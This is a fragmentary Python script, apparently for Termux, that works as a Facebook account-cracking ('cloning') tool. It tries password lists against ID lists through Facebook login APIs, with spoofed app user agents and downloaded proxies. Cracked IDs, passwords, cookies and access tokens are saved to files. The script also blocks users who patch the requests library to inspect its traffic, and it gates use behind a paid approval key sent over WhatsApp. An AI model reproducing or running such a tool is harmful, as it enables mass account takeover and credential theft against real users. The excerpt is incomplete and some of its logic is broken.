...
time.sleep(3)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN WHATSAPP GROUP")
time.sleep(3)
os.system(f'xdg-open https://chat.whatsapp.com/KlyBT20xhbj9IVHeJSjoi2')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN FACEBOOK GROUP")
time.sleep(3)
os.system(f'xdg-open https://m.facebook.com/groups/6573391069396776/')

# =================== ADDED 4 USER-AGENT GENERATORS (from M5) ===================
def morshed_oreo():
    models = ['SM-G960F', 'SM-G965F', 'SM-N950F', 'Pixel 2']
    ua = f'[FBAN/FB4A;FBAV/{random.randint(11,99)}.0.0.{random.randint(1111,9999)};FBBV/{random.randint(1111111,9999999)};[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{{density=2.25,width=720,height=1280}};FBLC/en_US;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{random.choice(models)};FBSV/8.0.0;FBOP/19;FBCA/arm64-v8a:arm64;]'
    return ua
    
def morshed_marshmallow():
    models = ['SM-G920F', 'SM-G925F', 'SM-A500F', 'SM-J700F']
    ua = f'[FBAN/FB4A;FBAV/{random.randint(11,99)}.0.0.{random.randint(1111,9999)};FBBV/{random.randint(1111111,9999999)};[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{{density=2.25,width=720,height=1280}};FBLC/en_US;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{random.choice(models)};FBSV/6.0.1;FBOP/19;FBCA/arm64-v8a:arm64;]'
    return ua

# -------------------------------------------------------------------------

#--------------------------proxies---------------------------#
king='/data/data/com.termux/files/usr/lib/python3.13/site-packages/requests/'
if not 'print' in open(king+'sessions.py','r').read():
    pass
else:
    exit('\033[1;32mDONT TRY TO CAPTURE')
qeen='/data/data/com.termux/files/usr/lib/python3.13/site-packages/requests/'
if not 'print' in open(qeen+'models.py','r').read():
    pass
else:
    exit('\033[1;32mDONT TRY TO CAPTURE')
don='/data/data/com.termux/files/usr/lib/python3.13/site-packages/requests/'
...
try:
	prox= requests.get('https://raw.githubusercontent.com/MAHDI-143/proxies/main/proxies.txt').text
...
def get_random_ua():
    all_uas = [morshed_oreo(), morshed1(), morshed_marshmallow()]
...
logo = (f"""
╔════════════════════════════════════════╗
║ \x1b[38;5;46md8888b.  .d88b.   .d88b.  .88b  d88.\x1b[0m   ║
║ \x1b[38;5;47m88  `8D .8P  Y8. .8P  Y8. 88'YbdP`88\x1b[0m   ║
║ \x1b[38;5;48m88   88 88    88 88    88 88  88  88\x1b[0m   ║
║ \x1b[38;5;49m88   88 88    88 88    88 88  88  88\x1b[0m   ║
║ \x1b[38;5;50m88  .8D `8b  d8' `8b  d8' 88  88  88\x1b[0m   ║
║ \x1b[38;5;51mY8888D'  `Y88P'   `Y88P'  YP  YP  YP\x1b[0m   ║
╚════════════════════════════════════════╝
{G}✦{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}✦
\x1b[1;92m {XX}[\x1b[1;92m◈{XX}]\x1b[38;5;46m CREATOR   : DOOM            
\x1b[1;92m {XX}[\x1b[1;92m◈{XX}] \x1b[38;5;47mFACEBOOK  : MAHDI
\x1b[1;92m {XX}[\x1b[1;92m◈{XX}] \x1b[38;5;47mVERSION   : 1.0              
{G}✦{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}✦""")
def linex():
        print(f'{G}✦{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}✦')
def clear():
...
try:
    os.system('clear')
    xnx = requests.get('https://github.com/MAHDI-143/Approvals/blob/main/Approvals').text
    ...
    print(f" {WW} \x1b[1;97m[{WW}⍣\x1b[1;97m]\33[1;92m {WW}FIX YOUR INTERNET BRUH")
    sys.exit()
...
def menu():
  ...
  try:
    httpCaht = requests.get('https://github.com/MAHDI-143/Approvals/blob/main/Approvals').text    
    if id in httpCaht:
      ...
      print(f'{WW} \x1b[1;97m[{WW}⍣\x1b[1;97m]\33[1;92m {WW}YOUR KEY  : =['+id+']=')
      linex()
      print(f"{WW} \x1b[1;97m[{WW}⍣\x1b[1;97m]\33[1;92m {WW}NOTE !")
      print(f"{WW} \x1b[1;97m[{WW}⍣\x1b[1;97m]\33[1;92m {WW}NO APPROVAL? NO ENTRY 🔐")
      print(f"{WW} \x1b[1;97m[{WW}⍣\x1b[1;97m]\33[1;92m {WW}SEND YOUR KEY TO ADMIN 🗝️")
      linex()
      input(f'{WW} \x1b[1;97m[{WW}⍣\x1b[1;97m]\33[1;92m {WW}IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('ACCESS REQUEST%20|%20Authorization Key : '+id+'%20|%20Submitted For Approval — Please Verify And Grant Access.');os.system('am start https://wa.me/+8801305703329?text='+tks),approval()
      time.sleep(9)
      approval()
  except:
    sys.exit()
...
def menu_a():
			...
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m FILE NAME : /sdcard/DOOM.txt  etc..')
				linex()
				...
				# RANDOM CLONING DISABLED
				clear()
				print(f"\n[!] RANDOM CLONING IS DISABLED")
				print(f"[!] Please use FILE CLONING (Option 1)")
				time.sleep(2)
				menu()
...
def RANDOM():
	# This function is kept for compatibility but no longer used (option 2 disabled)
	clear()
	print("\n[!] RANDOM CLONING IS DISABLED")
	print("[!] Please use FILE CLONING (Option 1)")
	time.sleep(2)
	menu()
...
def api2(ids,names,passlist):
        try:
                ...
                # CHANGED: use get_random_ua() instead of morshed1()
                current_ua = get_random_ua()
                sys.stdout.write(f'\r {bb}[{G}DOOM-M2{bb}]-[{G}%s{bb}]-[{G}OK:%s{bb}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        headers={
                                ...
                                'User-Agent': current_ua,   # <--- RANDOM UA FROM 4 SOURCES
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {bb}[{G}DOOM-OK✅{bb}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/DOOM-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[DOOM-2F🤥] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[DOOM-CP 👀] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DOOM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/DOOM-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        try:
                ...
                # CHANGED: use get_random_ua() instead of morshed1()
                current_ua = get_random_ua()
                sys.stdout.write(f'\r {bb}[{G}DOOM-M1{bb}]-[{G}%s{bb}]-[{G}OK:%s{bb}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mMAHDI-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bb}[{G}MAHDI-OK{bb}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bb}[{G}•{bb}]{G} '+kuki+'')
                linex()
                open('/sdcard/MAHDI-RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mMAHDI-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bb}[{G}•{bb}]{G} '+kuki+'')
                linex()
                open('/sdcard/MAHDI-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mMAHDI-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bb}[{G}•{bb}]{G} '+kuki+'')
                linex()
                open('/sdcard/MAHDI-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
